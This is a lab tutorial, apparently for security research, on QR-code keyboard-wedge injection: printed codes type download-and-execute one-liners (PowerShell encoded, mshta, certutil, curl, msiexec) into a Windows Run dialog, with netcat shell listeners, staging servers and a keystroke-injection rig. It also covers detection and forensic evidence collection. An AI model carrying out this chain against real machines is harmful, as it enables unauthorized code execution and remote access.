# Scan-to-Execution Walkthrough — from printed QR to shell, on your lab bench

This is the end-to-end tutorial for the moment you have **a scanner (or the rig) and a lab victim VM** and want to run the chain: payload → QR sheet → physical scan → execution → captured evidence.

> **AUTHORIZATION — LAB ONLY.** Every step targets owned VMs and owned hardware (GX.1/GX.2, `docs/governance/policy.md`). All endpoints are lab placeholders; nothing here contains live infrastructure. You are responsible for having authorization for anything you point this at.

## 0. Prerequisites

| Item | Where / how to check |
|---|---|
| Victim VM: unlocked Windows 10 session (Sysmon + ScriptBlockLogging + Defender for W3/W4 evidence) | your lab |
| Attacker box (Unix + python3) | your lab |
| Scanner in **HID keyboard-wedge mode** (not CDC-serial) | verify first: `tools/descriptor_dump.sh` → classify per `CLASSIFICATION-NOTES.txt` → record in `data/scanners.csv` — **if the scanner is not a HID wedge, the chain cannot fire; that negative result is W1.1 data** |
| Printed sheets at 100% scale (verify the 10mm calibration bars with a ruler) | any printer |
| No scanner yet? | Path B: the Pro Micro rig (`lab/rig/`) types the same strings |

## 1. Pick and render a payload (P3 corpus)

```bash
# one-time: create your LAB target config (gitignored — never commit real endpoints)
cp payloads/targets.toml.example payloads/targets.toml
$EDITOR payloads/targets.toml        # point host/URLs at YOUR lab attacker VM

# render the matrix — prints exact commands + expected artifacts, executes NOTHING
python3 payloads/run_matrix.py payloads/targets.toml --dry-run
python3 payloads/run_matrix.py payloads/targets.toml --dry-run --template mshta-001
```

The corpus (`payloads/manifest.yaml`, IDs locked in `COORDINATION.md` contract #4):

| ID | Class | Use when |
|---|---|---|
| `ps-enc-001` | `powershell -w hidden -enc <b64>` | baseline reproduction (US-layout target) |
| `mshta-001` | `mshta http://<lab>/payload.hta` | PowerShell removed but script engines alive |
| `curl-001` | `cmd /c "curl.exe … && exec"` | Win10 1803+ |
| `certutil-001` | `cmd /c "certutil -urlcache … && exec"` | pre-1803 fallback; strong UA IOC |
| `msiexec-001` | `msiexec /i \\<lab>\share\setup.msi /qn` | SMB-staged install |
| `unc-001` | `\\<lab>\share\tool.exe` | minimal-keystroke control case |

Save the rendered one-liner you want to fire: `… > payload.txt` (or just use the prebuilt baseline chain in step 3b).

## 2. Put the payload on paper (P2)

```bash
pip install -e './qrducky[dev]'

qr-ducky sheet --payload payload.txt --out sheet.pdf --module 4 --ec M --png
```

Print `sheet.pdf` at **100% scale**. `--module 4` ≈ comfortable scan range; `--ec M` is the reliability default (P1's `data/symbology.csv` will calibrate this properly once your bench data lands).

**Layout note (the W2.2 research core):** the sheet above carries the **raw command** — it executes only when the victim's active keyboard layout matches what the payload assumes (US). If you need layout robustness, the tooling ships `encode --mode alnum` (a letter stream that survives US/DE/FR identically — `qrducky/README.md` has the failure matrix) plus reference decoders and PowerShell decode hints; on-target decoding of the alnum stream is the runner-side problem tracked under contract #4 `layout_safe`. For a US-locale lab VM, the raw sheet is the faithful reproduction.

## 3. Arm the bench

**Victim (before the scan):**
```bash
# from lab/capture/ — records every keystroke event as contract-#1 JSONL
python capture_keystrokes.py --session sess-w01 --source scanner
```

**Attacker (listeners per staging type):**
```bash
lab/scripts/nc_listener.sh 7775 &                        # shell callback
lab/scripts/http_server.sh 7776 lab/baseline/out        # staging fetches (or your hta/exe dir)
```

Leave the victim **unlocked, nothing focused except the desktop** — the `GUI r` prefix needs a clean shot at the Run prompt.

## 4. The moment — scan

1. `Win + R` on the victim (or let the rig/scanner prefix do it — see Path B).
2. Scan the printed code. The wedge types the one-liner into the Run dialog at machine speed; the trailing ENTER executes it.
3. Observe, in order: staging GET in the HTTP server log → callback on the netcat listener (for `ps-enc-001`) → the capture JSONL fills with a burst.

## 5. Collect the evidence (this is the research payoff)

```bash
# timing detection: run the P4 detector on the captured session
uv run python -m detection.detector.pipeline keystrokes-sess-w01.jsonl --label source
```

- **W3.1**: record the verdict (bypassed/blocked/partial) in `payloads/results/killchain.csv` per template
- **W4.3**: collect the artifacts listed in `detection/runbook.md` (RunMRU, Sysmon EID 1 lineage, PS 4104, AMSI 1116, prefetch, ShimCache) — each row un-TEMPLATEs as you confirm it
- **W4.2**: your real contract-#1 logs replace the synthetic baseline in `detection/dataset/`

## 6. Takedown

Close listeners; delete `%TEMP%` staged artifacts on the victim; note that the RunMRU value persists (`HKCU\…\Explorer\RunMRU`) — the W3.3 anti-forensics stage addresses scrubbing; archive the session JSONL.

## Path B — no scanner yet: the rig

```bash
# 1. flash lab/rig/rig_replay/rig_replay.ino onto a Pro Micro (see lab/rig/README.md)
# 2. same payload, typed by the rig instead of a scanner:
python lab/rig/send_payload.py --port <COM/tty> --payload payload.txt --prefix "GUI r" --suffix ENTER
# or via the bench harness (adds repeat/counting + JSONL stats):
qr-ducky bench --target <vm-from-qrducky.toml> --payload payload.txt   # live mode: fill serial_port first
```

The rig emits the same contract-#1 JSONL (`source: rig`) — it is the ground-truth injector for P4's timing detector.

## Command cheatsheet

```bash
run_matrix.py --dry-run --template <id>     # render one payload (never executes)
qr-ducky encode --payload p.txt --mode alnum|hex|b64 [--json]
qr-ducky sheet --payload p.txt --out s.pdf --module 4 --ec M --png
capture_keystrokes.py --session <id> --source human|scanner|rig
detection.detector.pipeline <jsonl> --label source
lab/scripts/nc_listener.sh 7775 / http_server.sh 7776 <dir>
```
